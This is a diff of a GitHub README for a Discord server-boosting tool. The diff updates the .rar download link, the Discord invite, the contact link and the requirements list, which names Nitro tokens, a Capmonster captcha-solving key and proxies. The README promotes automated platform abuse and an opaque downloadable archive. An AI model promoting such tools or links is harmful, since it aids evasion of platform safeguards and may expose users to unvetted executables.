@@ -6,20 +6,20 @@
   Remember This Boost Tool ONLY allows you to boost servers if you have nitro tokens!
 </h2>
 <h2 align="center">
-  <a href="https://github.com/celgz/Boost-Bot/releases/download/Discord-Boost-Bot/b00st-tool.rar">PRESS TO DOWNLOAD INSTANTLY</a>
+  <a href="https://github.com/celgz/Boost-Bot/releases/download/Discord-Boost-Tool/KARMA-Boost-Tool.rar">DOWNLOAD</a>
 </h2>
 
 <h3 align="center">
-<a href="https://discord.gg/uPVEtUBTYg">JOIN MY DISCORD SERVER</a>
+<a href="https://discord.gg/gui">JOIN THE DISCORD SERVER</a>
 </h3>
 
-![image](https://cdn.discordapp.com/attachments/1127287128880074855/1148582336968015924/image.png) 
+![image](https://cdn.discordapp.com/attachments/1154132686642888756/1154490285791903884/image.png) 
 
 <h3 align="center">
 Please ⭐ This Repo If You Like It!
 </h3>
 <h3 align="center">
-<a href="https://guns.lol/law">CONTACT ME HERE</a>
+<a href="https://guns.lol/opsec">CONTACT ME HERE</a>
 </h3>
 
 
@@ -35,6 +35,6 @@ Download Python here: [Python](https://www.python.org/downloads/)
 
 ### Requirements:
 - [x] - **Windows 10 / 11**
-- [x] - **Python** [DOWNLOAD HERE](https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe)
-- [x] - **Capmonster key** (I Already Put A Key In There So U Dont Need One 😘)
+- [x] - **Python** [DOWNLOAD](https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe)
+- [x] - **Capmonster key** 
 - [ ] - **Your own proxies (I recommend paid proxies but free works)**
